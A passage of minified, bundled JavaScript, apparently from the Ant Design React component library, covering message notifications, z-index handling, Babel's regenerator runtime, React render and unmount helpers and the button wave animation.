            d: "M988 548c-19.9 0-36-16.1-36-36 0-59.4-11.6-117-34.6-171.3a440.45 440.45 0 00-94.3-139.9 437.71 437.71 0 00-139.9-94.3C629 83.6 571.4 72 512 72c-19.9 0-36-16.1-36-36s16.1-36 36-36c69.1 0 136.2 13.5 199.3 40.3C772.3 66 827 103 874 150c47 47 83.9 101.8 109.7 162.7 26.7 63.1 40.2 130.2 40.2 199.3.1 19.9-16 36-35.9 36z",
          },
        },
      ],
    },
    name: "loading",
    theme: "outlined",
  },
  LoadingOutlined = function (a, o) {
    return reactExports.createElement(
      Icon,
      _extends({}, a, { ref: o, icon: LoadingOutlined$1 })
    );
  },
  RefIcon$7 = reactExports.forwardRef(LoadingOutlined);
const zIndexContext = React$1.createContext(void 0),
  CONTAINER_OFFSET = 100,
  CONTAINER_OFFSET_MAX_COUNT = 10,
  CONTAINER_MAX_OFFSET = CONTAINER_OFFSET * CONTAINER_OFFSET_MAX_COUNT,
  containerBaseZIndexOffset = {
    Modal: CONTAINER_OFFSET,
    Drawer: CONTAINER_OFFSET,
    Popover: CONTAINER_OFFSET,
    Popconfirm: CONTAINER_OFFSET,
    Tooltip: CONTAINER_OFFSET,
    Tour: CONTAINER_OFFSET,
    FloatButton: CONTAINER_OFFSET,
  },
  consumerBaseZIndexOffset = {
    SelectLike: 50,
    Dropdown: 50,
    DatePicker: 50,
    Menu: 50,
    ImagePreview: 1,
  };
function isContainerType(i) {
  return i in containerBaseZIndexOffset;
}
const useZIndex = (i, a) => {
    const [, o] = useToken(),
      s = React$1.useContext(zIndexContext),
      tt = isContainerType(i);
    let nt;
    if (a !== void 0) nt = [a, a];
    else {
      let ot = s ?? 0;
      tt
        ? (ot += (s ? 0 : o.zIndexPopupBase) + containerBaseZIndexOffset[i])
        : (ot += consumerBaseZIndexOffset[i]),
        (nt = [s === void 0 ? a : ot, ot]);
    }
    return nt;
  },
  genMessageStyle = (i) => {
    const {
        componentCls: a,
        iconCls: o,
        boxShadow: s,
        colorText: tt,
        colorSuccess: nt,
        colorError: ot,
        colorWarning: st,
        colorInfo: ft,
        fontSizeLG: ht,
        motionEaseInOutCirc: gt,
        motionDurationSlow: St,
        marginXS: vt,
        paddingXS: _t,
        borderRadiusLG: Et,
        zIndexPopup: Ct,
        contentPadding: Pt,
        contentBg: bt,
      } = i,
      xt = `${a}-notice`,
      yt = new Keyframe("MessageMoveIn", {
        "0%": { padding: 0, transform: "translateY(-100%)", opacity: 0 },
        "100%": { padding: _t, transform: "translateY(0)", opacity: 1 },
      }),
      wt = new Keyframe("MessageMoveOut", {
        "0%": { maxHeight: i.height, padding: _t, opacity: 1 },
        "100%": { maxHeight: 0, padding: 0, opacity: 0 },
      }),
      $t = {
        padding: _t,
        textAlign: "center",
        [`${a}-custom-content`]: { display: "flex", alignItems: "center" },
        [`${a}-custom-content > ${o}`]: { marginInlineEnd: vt, fontSize: ht },
        [`${xt}-content`]: {
          display: "inline-block",
          padding: Pt,
          background: bt,
          borderRadius: Et,
          boxShadow: s,
          pointerEvents: "all",
        },
        [`${a}-success > ${o}`]: { color: nt },
        [`${a}-error > ${o}`]: { color: ot },
        [`${a}-warning > ${o}`]: { color: st },
        [`${a}-info > ${o},
      ${a}-loading > ${o}`]: { color: ft },
      };
    return [
      {
        [a]: Object.assign(Object.assign({}, resetComponent(i)), {
          color: tt,
          position: "fixed",
          top: vt,
          width: "100%",
          pointerEvents: "none",
          zIndex: Ct,
          [`${a}-move-up`]: { animationFillMode: "forwards" },
          [`
        ${a}-move-up-appear,
        ${a}-move-up-enter
      `]: {
            animationName: yt,
            animationDuration: St,
            animationPlayState: "paused",
            animationTimingFunction: gt,
          },
          [`
        ${a}-move-up-appear${a}-move-up-appear-active,
        ${a}-move-up-enter${a}-move-up-enter-active
      `]: { animationPlayState: "running" },
          [`${a}-move-up-leave`]: {
            animationName: wt,
            animationDuration: St,
            animationPlayState: "paused",
            animationTimingFunction: gt,
          },
          [`${a}-move-up-leave${a}-move-up-leave-active`]: {
            animationPlayState: "running",
          },
          "&-rtl": { direction: "rtl", span: { direction: "rtl" } },
        }),
      },
      { [a]: { [`${xt}-wrapper`]: Object.assign({}, $t) } },
      {
        [`${a}-notice-pure-panel`]: Object.assign(Object.assign({}, $t), {
          padding: 0,
          textAlign: "start",
        }),
      },
    ];
  },
  prepareComponentToken$3 = (i) => ({
    zIndexPopup: i.zIndexPopupBase + CONTAINER_MAX_OFFSET + 10,
    contentBg: i.colorBgElevated,
    contentPadding: `${(i.controlHeightLG - i.fontSize * i.lineHeight) / 2}px ${
      i.paddingSM
    }px`,
  }),
  useStyle$6 = genStyleHooks(
    "Message",
    (i) => {
      const a = merge(i, { height: 150 });
      return [genMessageStyle(a)];
    },
    prepareComponentToken$3
  );
var __rest$b = function (i, a) {
  var o = {};
  for (var s in i)
    Object.prototype.hasOwnProperty.call(i, s) &&
      a.indexOf(s) < 0 &&
      (o[s] = i[s]);
  if (i != null && typeof Object.getOwnPropertySymbols == "function")
    for (var tt = 0, s = Object.getOwnPropertySymbols(i); tt < s.length; tt++)
      a.indexOf(s[tt]) < 0 &&
        Object.prototype.propertyIsEnumerable.call(i, s[tt]) &&
        (o[s[tt]] = i[s[tt]]);
  return o;
};
const TypeIcon = {
    info: reactExports.createElement(RefIcon$8, null),
    success: reactExports.createElement(RefIcon$c, null),
    error: reactExports.createElement(RefIcon$b, null),
    warning: reactExports.createElement(RefIcon$9, null),
    loading: reactExports.createElement(RefIcon$7, null),
  },
  PureContent = (i) => {
    let { prefixCls: a, type: o, icon: s, children: tt } = i;
    return reactExports.createElement(
      "div",
      { className: classNames(`${a}-custom-content`, `${a}-${o}`) },
      s || TypeIcon[o],
      reactExports.createElement("span", null, tt)
    );
  },
  PurePanel$1 = (i) => {
    const { prefixCls: a, className: o, type: s, icon: tt, content: nt } = i,
      ot = __rest$b(i, ["prefixCls", "className", "type", "icon", "content"]),
      { getPrefixCls: st } = reactExports.useContext(ConfigContext),
      ft = a || st("message"),
      ht = useCSSVarCls(ft),
      [gt, St, vt] = useStyle$6(ft, ht);
    return gt(
      reactExports.createElement(
        Notify,
        Object.assign({}, ot, {
          prefixCls: ft,
          className: classNames(o, St, `${ft}-notice-pure-panel`, vt, ht),
          eventKey: "pure",
          duration: null,
          content: reactExports.createElement(
            PureContent,
            { prefixCls: ft, type: s, icon: tt },
            nt
          ),
        })
      )
    );
  };
function getMotion$1(i, a) {
  return { motionName: a ?? `${i}-move-up` };
}
function wrapPromiseFn(i) {
  let a;
  const o = new Promise((tt) => {
      a = i(() => {
        tt(!0);
      });
    }),
    s = () => {
      a == null || a();
    };
  return (s.then = (tt, nt) => o.then(tt, nt)), (s.promise = o), s;
}
var __rest$a = function (i, a) {
  var o = {};
  for (var s in i)
    Object.prototype.hasOwnProperty.call(i, s) &&
      a.indexOf(s) < 0 &&
      (o[s] = i[s]);
  if (i != null && typeof Object.getOwnPropertySymbols == "function")
    for (var tt = 0, s = Object.getOwnPropertySymbols(i); tt < s.length; tt++)
      a.indexOf(s[tt]) < 0 &&
        Object.prototype.propertyIsEnumerable.call(i, s[tt]) &&
        (o[s[tt]] = i[s[tt]]);
  return o;
};
const DEFAULT_OFFSET = 8,
  DEFAULT_DURATION = 3,
  Wrapper = (i) => {
    let { children: a, prefixCls: o } = i;
    const s = useCSSVarCls(o),
      [tt, nt, ot] = useStyle$6(o, s);
    return tt(
      reactExports.createElement(
        NotificationProvider,
        { classNames: { list: classNames(nt, ot, s) } },
        a
      )
    );
  },
  renderNotifications = (i, a) => {
    let { prefixCls: o, key: s } = a;
    return reactExports.createElement(Wrapper, { prefixCls: o, key: s }, i);
  },
  Holder = reactExports.forwardRef((i, a) => {
    const {
        top: o,
        prefixCls: s,
        getContainer: tt,
        maxCount: nt,
        duration: ot = DEFAULT_DURATION,
        rtl: st,
        transitionName: ft,
        onAllRemoved: ht,
      } = i,
      {
        getPrefixCls: gt,
        getPopupContainer: St,
        message: vt,
        direction: _t,
      } = reactExports.useContext(ConfigContext),
      Et = s || gt("message"),
      Ct = () => ({
        left: "50%",
        transform: "translateX(-50%)",
        top: o ?? DEFAULT_OFFSET,
      }),
      Pt = () => classNames({ [`${Et}-rtl`]: st ?? _t === "rtl" }),
      bt = () => getMotion$1(Et, ft),
      xt = reactExports.createElement(
        "span",
        { className: `${Et}-close-x` },
        reactExports.createElement(RefIcon$a, { className: `${Et}-close-icon` })
      ),
      [yt, wt] = useNotification({
        prefixCls: Et,
        style: Ct,
        className: Pt,
        motion: bt,
        closable: !1,
        closeIcon: xt,
        duration: ot,
        getContainer: () =>
          (tt == null ? void 0 : tt()) ||
          (St == null ? void 0 : St()) ||
          document.body,
        maxCount: nt,
        onAllRemoved: ht,
        renderNotifications,
      });
    return (
      reactExports.useImperativeHandle(a, () =>
        Object.assign(Object.assign({}, yt), { prefixCls: Et, message: vt })
      ),
      wt
    );
  });
let keyIndex = 0;
function useInternalMessage(i) {
  const a = reactExports.useRef(null);
  return (
    devUseWarning(),
    [
      reactExports.useMemo(() => {
        const s = (ft) => {
            var ht;
            (ht = a.current) === null || ht === void 0 || ht.close(ft);
          },
          tt = (ft) => {
            if (!a.current) {
              const kt = () => {};
              return (kt.then = () => {}), kt;
            }
            const { open: ht, prefixCls: gt, message: St } = a.current,
              vt = `${gt}-notice`,
              {
                content: _t,
                icon: Et,
                type: Ct,
                key: Pt,
                className: bt,
                style: xt,
                onClose: yt,
              } = ft,
              wt = __rest$a(ft, [
                "content",
                "icon",
                "type",
                "key",
                "className",
                "style",
                "onClose",
              ]);
            let $t = Pt;
            return (
              $t == null &&
                ((keyIndex += 1), ($t = `antd-message-${keyIndex}`)),
              wrapPromiseFn(
                (kt) => (
                  ht(
                    Object.assign(Object.assign({}, wt), {
                      key: $t,
                      content: reactExports.createElement(
                        PureContent,
                        { prefixCls: gt, type: Ct, icon: Et },
                        _t
                      ),
                      placement: "top",
                      className: classNames(
                        Ct && `${vt}-${Ct}`,
                        bt,
                        St == null ? void 0 : St.className
                      ),
                      style: Object.assign(
                        Object.assign({}, St == null ? void 0 : St.style),
                        xt
                      ),
                      onClose: () => {
                        yt == null || yt(), kt();
                      },
                    })
                  ),
                  () => {
                    s($t);
                  }
                )
              )
            );
          },
          ot = {
            open: tt,
            destroy: (ft) => {
              var ht;
              ft !== void 0
                ? s(ft)
                : (ht = a.current) === null || ht === void 0 || ht.destroy();
            },
          };
        return (
          ["info", "success", "warning", "error", "loading"].forEach((ft) => {
            const ht = (gt, St, vt) => {
              let _t;
              gt && typeof gt == "object" && "content" in gt
                ? (_t = gt)
                : (_t = { content: gt });
              let Et, Ct;
              typeof St == "function" ? (Ct = St) : ((Et = St), (Ct = vt));
              const Pt = Object.assign(
                Object.assign({ onClose: Ct, duration: Et }, _t),
                { type: ft }
              );
              return tt(Pt);
            };
            ot[ft] = ht;
          }),
          ot
        );
      }, []),
      reactExports.createElement(
        Holder,
        Object.assign({ key: "message-holder" }, i, { ref: a })
      ),
    ]
  );
}
function useMessage(i) {
  return useInternalMessage(i);
}
function _regeneratorRuntime() {
  _regeneratorRuntime = function () {
    return a;
  };
  var i,
    a = {},
    o = Object.prototype,
    s = o.hasOwnProperty,
    tt =
      Object.defineProperty ||
      function (Mt, Ft, Tt) {
        Mt[Ft] = Tt.value;
      },
    nt = typeof Symbol == "function" ? Symbol : {},
    ot = nt.iterator || "@@iterator",
    st = nt.asyncIterator || "@@asyncIterator",
    ft = nt.toStringTag || "@@toStringTag";
  function ht(Mt, Ft, Tt) {
    return (
      Object.defineProperty(Mt, Ft, {
        value: Tt,
        enumerable: !0,
        configurable: !0,
        writable: !0,
      }),
      Mt[Ft]
    );
  }
  try {
    ht({}, "");
  } catch {
    ht = function (Tt, At, Lt) {
      return (Tt[At] = Lt);
    };
  }
  function gt(Mt, Ft, Tt, At) {
    var Lt = Ft && Ft.prototype instanceof bt ? Ft : bt,
      jt = Object.create(Lt.prototype),
      Dt = new Gt(At || []);
    return tt(jt, "_invoke", { value: Nt(Mt, Tt, Dt) }), jt;
  }
  function St(Mt, Ft, Tt) {
    try {
      return { type: "normal", arg: Mt.call(Ft, Tt) };
    } catch (At) {
      return { type: "throw", arg: At };
    }
  }
  a.wrap = gt;
  var vt = "suspendedStart",
    _t = "suspendedYield",
    Et = "executing",
    Ct = "completed",
    Pt = {};
  function bt() {}
  function xt() {}
  function yt() {}
  var wt = {};
  ht(wt, ot, function () {
    return this;
  });
  var $t = Object.getPrototypeOf,
    kt = $t && $t($t(Vt([])));
  kt && kt !== o && s.call(kt, ot) && (wt = kt);
  var Rt = (yt.prototype = bt.prototype = Object.create(wt));
  function It(Mt) {
    ["next", "throw", "return"].forEach(function (Ft) {
      ht(Mt, Ft, function (Tt) {
        return this._invoke(Ft, Tt);
      });
    });
  }
  function Ot(Mt, Ft) {
    function Tt(Lt, jt, Dt, Ut) {
      var Ht = St(Mt[Lt], Mt, jt);
      if (Ht.type !== "throw") {
        var Kt = Ht.arg,
          qt = Kt.value;
        return qt && _typeof(qt) == "object" && s.call(qt, "__await")
          ? Ft.resolve(qt.__await).then(
              function (Qt) {
                Tt("next", Qt, Dt, Ut);
              },
              function (Qt) {
                Tt("throw", Qt, Dt, Ut);
              }
            )
          : Ft.resolve(qt).then(
              function (Qt) {
                (Kt.value = Qt), Dt(Kt);
              },
              function (Qt) {
                return Tt("throw", Qt, Dt, Ut);
              }
            );
      }
      Ut(Ht.arg);
    }
    var At;
    tt(this, "_invoke", {
      value: function (jt, Dt) {
        function Ut() {
          return new Ft(function (Ht, Kt) {
            Tt(jt, Dt, Ht, Kt);
          });
        }
        return (At = At ? At.then(Ut, Ut) : Ut());
      },
    });
  }
  function Nt(Mt, Ft, Tt) {
    var At = vt;
    return function (Lt, jt) {
      if (At === Et) throw Error("Generator is already running");
      if (At === Ct) {
        if (Lt === "throw") throw jt;
        return { value: i, done: !0 };
      }
      for (Tt.method = Lt, Tt.arg = jt; ; ) {
        var Dt = Tt.delegate;
        if (Dt) {
          var Ut = zt(Dt, Tt);
          if (Ut) {
            if (Ut === Pt) continue;
            return Ut;
          }
        }
        if (Tt.method === "next") Tt.sent = Tt._sent = Tt.arg;
        else if (Tt.method === "throw") {
          if (At === vt) throw ((At = Ct), Tt.arg);
          Tt.dispatchException(Tt.arg);
        } else Tt.method === "return" && Tt.abrupt("return", Tt.arg);
        At = Et;
        var Ht = St(Mt, Ft, Tt);
        if (Ht.type === "normal") {
          if (((At = Tt.done ? Ct : _t), Ht.arg === Pt)) continue;
          return { value: Ht.arg, done: Tt.done };
        }
        Ht.type === "throw" &&
          ((At = Ct), (Tt.method = "throw"), (Tt.arg = Ht.arg));
      }
    };
  }
  function zt(Mt, Ft) {
    var Tt = Ft.method,
      At = Mt.iterator[Tt];
    if (At === i)
      return (
        (Ft.delegate = null),
        (Tt === "throw" &&
          Mt.iterator.return &&
          ((Ft.method = "return"),
          (Ft.arg = i),
          zt(Mt, Ft),
          Ft.method === "throw")) ||
          (Tt !== "return" &&
            ((Ft.method = "throw"),
            (Ft.arg = new TypeError(
              "The iterator does not provide a '" + Tt + "' method"
            )))),
        Pt
      );
    var Lt = St(At, Mt.iterator, Ft.arg);
    if (Lt.type === "throw")
      return (Ft.method = "throw"), (Ft.arg = Lt.arg), (Ft.delegate = null), Pt;
    var jt = Lt.arg;
    return jt
      ? jt.done
        ? ((Ft[Mt.resultName] = jt.value),
          (Ft.next = Mt.nextLoc),
          Ft.method !== "return" && ((Ft.method = "next"), (Ft.arg = i)),
          (Ft.delegate = null),
          Pt)
        : jt
      : ((Ft.method = "throw"),
        (Ft.arg = new TypeError("iterator result is not an object")),
        (Ft.delegate = null),
        Pt);
  }
  function Bt(Mt) {
    var Ft = { tryLoc: Mt[0] };
    1 in Mt && (Ft.catchLoc = Mt[1]),
      2 in Mt && ((Ft.finallyLoc = Mt[2]), (Ft.afterLoc = Mt[3])),
      this.tryEntries.push(Ft);
  }
  function Wt(Mt) {
    var Ft = Mt.completion || {};
    (Ft.type = "normal"), delete Ft.arg, (Mt.completion = Ft);
  }
  function Gt(Mt) {
    (this.tryEntries = [{ tryLoc: "root" }]),
      Mt.forEach(Bt, this),
      this.reset(!0);
  }
  function Vt(Mt) {
    if (Mt || Mt === "") {
      var Ft = Mt[ot];
      if (Ft) return Ft.call(Mt);
      if (typeof Mt.next == "function") return Mt;
      if (!isNaN(Mt.length)) {
        var Tt = -1,
          At = function Lt() {
            for (; ++Tt < Mt.length; )
              if (s.call(Mt, Tt))
                return (Lt.value = Mt[Tt]), (Lt.done = !1), Lt;
            return (Lt.value = i), (Lt.done = !0), Lt;
          };
        return (At.next = At);
      }
    }
    throw new TypeError(_typeof(Mt) + " is not iterable");
  }
  return (
    (xt.prototype = yt),
    tt(Rt, "constructor", { value: yt, configurable: !0 }),
    tt(yt, "constructor", { value: xt, configurable: !0 }),
    (xt.displayName = ht(yt, ft, "GeneratorFunction")),
    (a.isGeneratorFunction = function (Mt) {
      var Ft = typeof Mt == "function" && Mt.constructor;
      return (
        !!Ft &&
        (Ft === xt || (Ft.displayName || Ft.name) === "GeneratorFunction")
      );
    }),
    (a.mark = function (Mt) {
      return (
        Object.setPrototypeOf
          ? Object.setPrototypeOf(Mt, yt)
          : ((Mt.__proto__ = yt), ht(Mt, ft, "GeneratorFunction")),
        (Mt.prototype = Object.create(Rt)),
        Mt
      );
    }),
    (a.awrap = function (Mt) {
      return { __await: Mt };
    }),
    It(Ot.prototype),
    ht(Ot.prototype, st, function () {
      return this;
    }),
    (a.AsyncIterator = Ot),
    (a.async = function (Mt, Ft, Tt, At, Lt) {
      Lt === void 0 && (Lt = Promise);
      var jt = new Ot(gt(Mt, Ft, Tt, At), Lt);
      return a.isGeneratorFunction(Ft)
        ? jt
        : jt.next().then(function (Dt) {
            return Dt.done ? Dt.value : jt.next();
          });
    }),
    It(Rt),
    ht(Rt, ft, "Generator"),
    ht(Rt, ot, function () {
      return this;
    }),
    ht(Rt, "toString", function () {
      return "[object Generator]";
    }),
    (a.keys = function (Mt) {
      var Ft = Object(Mt),
        Tt = [];
      for (var At in Ft) Tt.push(At);
      return (
        Tt.reverse(),
        function Lt() {
          for (; Tt.length; ) {
            var jt = Tt.pop();
            if (jt in Ft) return (Lt.value = jt), (Lt.done = !1), Lt;
          }
          return (Lt.done = !0), Lt;
        }
      );
    }),
    (a.values = Vt),
    (Gt.prototype = {
      constructor: Gt,
      reset: function (Ft) {
        if (
          ((this.prev = 0),
          (this.next = 0),
          (this.sent = this._sent = i),
          (this.done = !1),
          (this.delegate = null),
          (this.method = "next"),
          (this.arg = i),
          this.tryEntries.forEach(Wt),
          !Ft)
        )
          for (var Tt in this)
            Tt.charAt(0) === "t" &&
              s.call(this, Tt) &&
              !isNaN(+Tt.slice(1)) &&
              (this[Tt] = i);
      },
      stop: function () {
        this.done = !0;
        var Ft = this.tryEntries[0].completion;
        if (Ft.type === "throw") throw Ft.arg;
        return this.rval;
      },
      dispatchException: function (Ft) {
        if (this.done) throw Ft;
        var Tt = this;
        function At(Kt, qt) {
          return (
            (Dt.type = "throw"),
            (Dt.arg = Ft),
            (Tt.next = Kt),
            qt && ((Tt.method = "next"), (Tt.arg = i)),
            !!qt
          );
        }
        for (var Lt = this.tryEntries.length - 1; Lt >= 0; --Lt) {
          var jt = this.tryEntries[Lt],
            Dt = jt.completion;
          if (jt.tryLoc === "root") return At("end");
          if (jt.tryLoc <= this.prev) {
            var Ut = s.call(jt, "catchLoc"),
              Ht = s.call(jt, "finallyLoc");
            if (Ut && Ht) {
              if (this.prev < jt.catchLoc) return At(jt.catchLoc, !0);
              if (this.prev < jt.finallyLoc) return At(jt.finallyLoc);
            } else if (Ut) {
              if (this.prev < jt.catchLoc) return At(jt.catchLoc, !0);
            } else {
              if (!Ht) throw Error("try statement without catch or finally");
              if (this.prev < jt.finallyLoc) return At(jt.finallyLoc);
            }
          }
        }
      },
      abrupt: function (Ft, Tt) {
        for (var At = this.tryEntries.length - 1; At >= 0; --At) {
          var Lt = this.tryEntries[At];
          if (
            Lt.tryLoc <= this.prev &&
            s.call(Lt, "finallyLoc") &&
            this.prev < Lt.finallyLoc
          ) {
            var jt = Lt;
            break;
          }
        }
        jt &&
          (Ft === "break" || Ft === "continue") &&
          jt.tryLoc <= Tt &&
          Tt <= jt.finallyLoc &&
          (jt = null);
        var Dt = jt ? jt.completion : {};
        return (
          (Dt.type = Ft),
          (Dt.arg = Tt),
          jt
            ? ((this.method = "next"), (this.next = jt.finallyLoc), Pt)
            : this.complete(Dt)
        );
      },
      complete: function (Ft, Tt) {
        if (Ft.type === "throw") throw Ft.arg;
        return (
          Ft.type === "break" || Ft.type === "continue"
            ? (this.next = Ft.arg)
            : Ft.type === "return"
            ? ((this.rval = this.arg = Ft.arg),
              (this.method = "return"),
              (this.next = "end"))
            : Ft.type === "normal" && Tt && (this.next = Tt),
          Pt
        );
      },
      finish: function (Ft) {
        for (var Tt = this.tryEntries.length - 1; Tt >= 0; --Tt) {
          var At = this.tryEntries[Tt];
          if (At.finallyLoc === Ft)
            return this.complete(At.completion, At.afterLoc), Wt(At), Pt;
        }
      },
      catch: function (Ft) {
        for (var Tt = this.tryEntries.length - 1; Tt >= 0; --Tt) {
          var At = this.tryEntries[Tt];
          if (At.tryLoc === Ft) {
            var Lt = At.completion;
            if (Lt.type === "throw") {
              var jt = Lt.arg;
              Wt(At);
            }
            return jt;
          }
        }
        throw Error("illegal catch attempt");
      },
      delegateYield: function (Ft, Tt, At) {
        return (
          (this.delegate = { iterator: Vt(Ft), resultName: Tt, nextLoc: At }),
          this.method === "next" && (this.arg = i),
          Pt
        );
      },
    }),
    a
  );
}
function asyncGeneratorStep(i, a, o, s, tt, nt, ot) {
  try {
    var st = i[nt](ot),
      ft = st.value;
  } catch (ht) {
    return void o(ht);
  }
  st.done ? a(ft) : Promise.resolve(ft).then(s, tt);
}
function _asyncToGenerator(i) {
  return function () {
    var a = this,
      o = arguments;
    return new Promise(function (s, tt) {
      var nt = i.apply(a, o);
      function ot(ft) {
        asyncGeneratorStep(nt, s, tt, ot, st, "next", ft);
      }
      function st(ft) {
        asyncGeneratorStep(nt, s, tt, ot, st, "throw", ft);
      }
      ot(void 0);
    });
  };
}
var fullClone = _objectSpread2$1({}, ReactDOM$1),
  version = fullClone.version,
  reactRender = fullClone.render,
  unmountComponentAtNode = fullClone.unmountComponentAtNode,
  createRoot;
try {
  var mainVersion = Number((version || "").split(".")[0]);
  mainVersion >= 18 && (createRoot = fullClone.createRoot);
} catch {}
function toggleWarning(i) {
  var a = fullClone.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED;
  a && _typeof(a) === "object" && (a.usingClientEntryPoint = i);
}
var MARK = "__rc_react_root__";
function modernRender(i, a) {
  toggleWarning(!0);
  var o = a[MARK] || createRoot(a);
  toggleWarning(!1), o.render(i), (a[MARK] = o);
}
function legacyRender(i, a) {
  reactRender == null || reactRender(i, a);
}
function render(i, a) {
  if (createRoot) {
    modernRender(i, a);
    return;
  }
  legacyRender(i, a);
}
function modernUnmount(i) {
  return _modernUnmount.apply(this, arguments);
}
function _modernUnmount() {
  return (
    (_modernUnmount = _asyncToGenerator(
      _regeneratorRuntime().mark(function i(a) {
        return _regeneratorRuntime().wrap(function (s) {
          for (;;)
            switch ((s.prev = s.next)) {
              case 0:
                return s.abrupt(
                  "return",
                  Promise.resolve().then(function () {
                    var tt;
                    (tt = a[MARK]) === null || tt === void 0 || tt.unmount(),
                      delete a[MARK];
                  })
                );
              case 1:
              case "end":
                return s.stop();
            }
        }, i);
      })
    )),
    _modernUnmount.apply(this, arguments)
  );
}
function legacyUnmount(i) {
  unmountComponentAtNode(i);
}
function unmount(i) {
  return _unmount.apply(this, arguments);
}
function _unmount() {
  return (
    (_unmount = _asyncToGenerator(
      _regeneratorRuntime().mark(function i(a) {
        return _regeneratorRuntime().wrap(function (s) {
          for (;;)
            switch ((s.prev = s.next)) {
              case 0:
                if (createRoot === void 0) {
                  s.next = 2;
                  break;
                }
                return s.abrupt("return", modernUnmount(a));
              case 2:
                legacyUnmount(a);
              case 3:
              case "end":
                return s.stop();
            }
        }, i);
      })
    )),
    _unmount.apply(this, arguments)
  );
}
const defaultReactRender = (i, a) => (render(i, a), () => unmount(a));
let unstableRender = defaultReactRender;
function getReactRender() {
  return unstableRender;
}
const getCollapsedHeight = () => ({ height: 0, opacity: 0 }),
  getRealHeight = (i) => {
    const { scrollHeight: a } = i;
    return { height: a, opacity: 1 };
  },
  getCurrentHeight = (i) => ({ height: i ? i.offsetHeight : 0 }),
  skipOpacityTransition = (i, a) =>
    (a == null ? void 0 : a.deadline) === !0 || a.propertyName === "height",
  initCollapseMotion = function () {
    return {
      motionName: `${
        arguments.length > 0 && arguments[0] !== void 0
          ? arguments[0]
          : defaultPrefixCls
      }-motion-collapse`,
      onAppearStart: getCollapsedHeight,
      onEnterStart: getCollapsedHeight,
      onAppearActive: getRealHeight,
      onEnterActive: getRealHeight,
      onLeaveStart: getCurrentHeight,
      onLeaveActive: getCollapsedHeight,
      onAppearEnd: skipOpacityTransition,
      onEnterEnd: skipOpacityTransition,
      onLeaveEnd: skipOpacityTransition,
      motionDeadline: 500,
    };
  },
  getTransitionName = (i, a, o) => (o !== void 0 ? o : `${i}-${a}`),
  isVisible = function (i) {
    if (!i) return !1;
    if (i instanceof Element) {
      if (i.offsetParent) return !0;
      if (i.getBBox) {
        var a = i.getBBox(),
          o = a.width,
          s = a.height;
        if (o || s) return !0;
      }
      if (i.getBoundingClientRect) {
        var tt = i.getBoundingClientRect(),
          nt = tt.width,
          ot = tt.height;
        if (nt || ot) return !0;
      }
    }
    return !1;
  },
  genWaveStyle = (i) => {
    const { componentCls: a, colorPrimary: o } = i;
    return {
      [a]: {
        position: "absolute",
        background: "transparent",
        pointerEvents: "none",
        boxSizing: "border-box",
        color: `var(--wave-color, ${o})`,
        boxShadow: "0 0 0 0 currentcolor",
        opacity: 0.2,
        "&.wave-motion-appear": {
          transition: [
            `box-shadow 0.4s ${i.motionEaseOutCirc}`,
            `opacity 2s ${i.motionEaseOutCirc}`,
          ].join(","),
          "&-active": { boxShadow: "0 0 0 6px currentcolor", opacity: 0 },
          "&.wave-quick": {
            transition: [
              `box-shadow ${i.motionDurationSlow} ${i.motionEaseInOut}`,
              `opacity ${i.motionDurationSlow} ${i.motionEaseInOut}`,
            ].join(","),
          },
        },
      },
    };
  },
  useStyle$5 = genComponentStyleHook("Wave", (i) => [genWaveStyle(i)]),
  TARGET_CLS = `${defaultPrefixCls}-wave-target`;
function isValidWaveColor(i) {
  return (
    i &&
    i !== "#fff" &&
    i !== "#ffffff" &&
    i !== "rgb(255, 255, 255)" &&
    i !== "rgba(255, 255, 255, 1)" &&
    !/rgba\((?:\d*, ){3}0\)/.test(i) &&
    i !== "transparent"
  );
}
function getTargetWaveColor(i) {
  const {
    borderTopColor: a,
    borderColor: o,
    backgroundColor: s,
  } = getComputedStyle(i);
  return isValidWaveColor(a)
    ? a
    : isValidWaveColor(o)
    ? o
    : isValidWaveColor(s)
    ? s
    : null;
}
function validateNum(i) {
  return Number.isNaN(i) ? 0 : i;
}
const WaveEffect = (i) => {
    const { className: a, target: o, component: s, registerUnmount: tt } = i,
      nt = reactExports.useRef(null),
      ot = reactExports.useRef(null);
    reactExports.useEffect(() => {
      ot.current = tt();
    }, []);
    const [st, ft] = reactExports.useState(null),
      [ht, gt] = reactExports.useState([]),
      [St, vt] = reactExports.useState(0),
      [_t, Et] = reactExports.useState(0),
      [Ct, Pt] = reactExports.useState(0),
      [bt, xt] = reactExports.useState(0),
      [yt, wt] = reactExports.useState(!1),
      $t = {
        left: St,
        top: _t,
        width: Ct,
        height: bt,
        borderRadius: ht.map((It) => `${It}px`).join(" "),
      };
    st && ($t["--wave-color"] = st);
    function kt() {
      const It = getComputedStyle(o);
      ft(getTargetWaveColor(o));
      const Ot = It.position === "static",
        { borderLeftWidth: Nt, borderTopWidth: zt } = It;
      vt(Ot ? o.offsetLeft : validateNum(-parseFloat(Nt))),
        Et(Ot ? o.offsetTop : validateNum(-parseFloat(zt))),
        Pt(o.offsetWidth),
        xt(o.offsetHeight);
      const {
        borderTopLeftRadius: Bt,
        borderTopRightRadius: Wt,
        borderBottomLeftRadius: Gt,
        borderBottomRightRadius: Vt,
      } = It;
      gt([Bt, Wt, Vt, Gt].map((Mt) => validateNum(parseFloat(Mt))));
    }
    if (
      (reactExports.useEffect(() => {
        if (o) {
          const It = wrapperRaf(() => {
            kt(), wt(!0);
          });
          let Ot;
          return (
            typeof ResizeObserver < "u" &&
              ((Ot = new ResizeObserver(kt)), Ot.observe(o)),
            () => {
              wrapperRaf.cancel(It), Ot == null || Ot.disconnect();
            }
          );
        }
      }, []),
      !yt)
    )
      return null;
    const Rt =
      (s === "Checkbox" || s === "Radio") &&
      (o == null ? void 0 : o.classList.contains(TARGET_CLS));
    return reactExports.createElement(
      CSSMotion,
      {
        visible: !0,
        motionAppear: !0,
        motionName: "wave-motion",
        motionDeadline: 5e3,
        onAppearEnd: (It, Ot) => {
          var Nt, zt;
          if (Ot.deadline || Ot.propertyName === "opacity") {
            const Bt =
              (Nt = nt.current) === null || Nt === void 0
                ? void 0
                : Nt.parentElement;
            (zt = ot.current) === null ||
              zt === void 0 ||
              zt.call(ot).then(() => {
                Bt == null || Bt.remove();
              });
          }
          return !1;
        },
      },
      (It, Ot) => {
        let { className: Nt } = It;
        return reactExports.createElement("div", {
          ref: composeRef(nt, Ot),
          className: classNames(a, Nt, { "wave-quick": Rt }),
          style: $t,
        });
      }
    );
  },
  showWaveEffect = (i, a) => {
    var o;
    const { component: s } = a;
    if (
